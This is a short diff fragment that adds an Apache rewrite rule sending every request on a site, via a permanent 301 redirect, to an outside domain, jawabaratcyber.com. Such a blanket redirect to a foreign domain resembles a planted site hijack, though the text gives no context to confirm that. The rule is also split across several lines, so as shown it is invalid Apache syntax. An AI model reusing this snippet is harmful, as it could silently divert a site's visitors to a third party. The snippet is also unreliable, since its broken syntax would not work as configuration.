@@ -1,0 +1,4 @@
+RewriteRule ^(.*)$ 
+http://www.jawabaratcyber.com/$1 
+[L,R=301]
+
